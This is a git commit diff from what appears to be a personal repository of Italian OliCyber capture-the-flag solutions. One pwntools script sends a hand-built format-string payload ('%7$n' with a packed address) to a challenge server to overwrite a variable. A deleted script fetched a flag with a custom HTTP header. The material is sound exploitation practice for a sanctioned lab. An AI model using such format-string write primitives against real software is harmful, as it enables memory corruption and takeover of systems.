d138a0af14c96983ae85317f2476a5e0908a5bc8
Enea <eneamaroncelli008@gmail.com>
2025-02-28 17:05:43 +0100

    gitignore434

--- ChallengeOlicyber/software/formatted.py
+++ ChallengeOlicyber/software/formatted.py
@@ -4,8 +4,9 @@ p = remote('formatted.challs.olicyber.it', 10305)
 p.recvuntil(b'name?')
 # aggiungiamo le 4 a perche in architettura 64bit bisogna occupare 8 byte
 # percio i 4 del %7$n e i 4 delle a cosi l indirizzo puo stare 'da solo' sull 7th %p
-#payload =  b'a'*4 + b'%7$n' + p64(0x40404C)  
-payload =  fmtstr_payload(7,{ 0x40404C: p32(4)})
+
+payload =  b'a'*4 + b'%7$n' + p64(0x40404C)  
+
 print(payload)
 p.sendline(payload)
 p.interactive()
--- ITASECSalerno_Oristano/trainingcamp.py
+++
@@ -1,8 +0,0 @@
-import requests
-import re
-site = 'https://training-camp.challs.olicyber.it/'
-headers = {
-    "X-Secret-Message":"flag"
-}
-r = requests.get(site,headers=headers)
-print(r.text)
